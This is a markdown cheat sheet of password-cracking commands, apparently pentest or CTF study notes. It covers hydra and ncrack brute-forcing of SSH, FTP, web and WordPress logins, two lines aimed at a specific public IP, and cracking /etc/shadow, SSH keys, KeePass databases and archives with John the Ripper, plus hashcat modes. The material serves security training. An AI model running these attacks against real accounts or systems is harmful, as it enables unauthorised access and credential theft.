# Password cracking
> Credits to the SCSP Community.

### Cracking SSH Password

```bash
hydra -L <username list> -P <password list> 10.10.10.10 ssh
ncrack -U <usernames list> -P <passwords list> ssh://10.10.10.10
```

### Cracking FTP Passwords

```bash
hydra -L <username list> -P <password list> 10.10.10.10 ftp
ncrack -U <usernames list> -P <passwords list> ftp://10.10.10.10
```

### Cracking Passwords when Service uses non-standard port

```bash
hydra -L <username list> -P <password list> -s <port> 10.10.10.10 ssh
ncrack -U <usernames list> -P <passwords list> 10.10.10.10:<port>
```

### Cracking Password Protected PDF files

```bash
pdfcrack -f <pdf file> -w <wordlist>
```

### Cracking Web-Application Password

* In Get Request

```bash
hydra -L <usernames list> -P <passwords list> <target ip> http-get <path to admin panel>
```

* In Post Request

```bash
hydra -L <usernames list> -P <passwords list> <target ip> http-form-post '<post request data, specify parameters with ^USER^ and ^PWD^>'
```

### Crack Wordpress Passwords

```bash
wpscan --url <target ip/wp-login> -U <usernames list> -P <path to wordlist>
```

### Brute force login form

```bash
hydra -L rockyou.txt -p idk -t 20 35.227.24.107 http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"
hydra -l sandy -P rockyou.txt -t 64 35.227.24.107 http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"
```

### Brute force zip file

```bash
fcrackzip -D -p <WORDLIST> -v <ZIP_FILE>
fcrackzip -v -u -D -p <WORDLIST> <ZIP_FILE>
```

```text
zip2john zipfile > ziphash.john
john ziphash.john --wordlist=wordlist.txt
```

### Crack /etc/shadow

```bash
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

### Identifying Hash Types

```bash
hashid <file containing hashes>
hashid -m <file containing hashes>      ### Shows hashcat mode
hashid -j <file containing hashes>      ### Shows john format
```

### Converting encrypted files into a format supported by John

```bash
unshadow etc_passwd_file etc_shadow_file | tee unshadowed_file

ssh2john.py encrypted_SSH_key_file | tee SSH_key.john

keepass2john kdb_file | tee keepass_hash.john

rar2john encrypted_rar_file | tee rar_file_hash.john

7z2john encrypted_7z_file | tee 7z_file_hash.john
```

### Cracking Hashes using John the Ripper

```bash
john --list=formats     ### outputs all supported formats
john <hash file> --wordlist=<path to wordlist>
john <hash file> --show (shows cracked hashes)
john <hash file> --wordlist=<path to wordlist> --format=<hash format>
john <hash file> --incremental      ### uses ASCII incremental mode
john <hash file> --incremental=digits       # uses digit incremental (mode: 0 to 99999999999999999999)
```

### Cracking Hashes using HashCat

```bash
hashcat -m <hash type mode> -a <attack mode> <hash file> <path to wordlist>
```

### HashCat Attack Modes \(-a\)

| mode | attack      |
|:---- |:----------- |
| 0    | Straight    |
| 1    | Combination |
| 3    | Brute-force |

### HashCat Hash Types \(-m\)

* Linux OS hashes

| type | hash             |
|:---- |:---------------- |
| 500  | MD5 \($1$\)      | 
| 3200 | Blowfish \($2$\) |
| 7400 | SHA256 \($5$\)   |
| 1800 | SHA512 \($6$\)   |

* Windows OS hashes

| type | hash |
|:---- |:---- |
| 1000 | NTLM |
| 3000 | LM   |

* MacOS hashes

| type | hash                  |
|:---- |:--------------------- |
| 122  | MacOS v10.4,10.5,10.6 |
| 1722 | MacOS v10.7           |
| 7100 | MacOS v10.8+          |

* Application hashes

| type  | hash     |
|:----- |:-------- |
| 900   | MD4      |
| 0     | MD5      |
| 100   | SHA1     |
| 1400  | SHA2-256 |
| 1700  | SHA2-512 |
| 17400 | SHA3-256 |
| 17600 | SHA3-512 |

* Network Protocol Hashes

| type  | hash                    |
|:----- |:----------------------- |
| 7500  | Kerberos 5              |
| 10200 | CRAM-MD5                |
| 11100 | PostgreSQL CRAM \(MD5\) |
| 11200 | MySQL CRAM \(SHA1\)     |
| 16500 | JSON Web Token          |

* Salted Hashes

| type | hash                   |
|:---- |:---------------------- |
| 10   | MD5 \(\$pass.\$salt\)    |
| 20   | MD5 \(\$salt.\$pass\)    |
| 110  | SHA1 \(\$pass.\$salt\)   |
| 1410 | SHA256 \(\$pass.\$salt\) |
| 1420 | SHA256 \(\$salt.\$pass\) |
| 1710 | SHA512 \(\$pass.\$salt\) |
| 1720 | SHA512 \(\$salt.\$pass\) |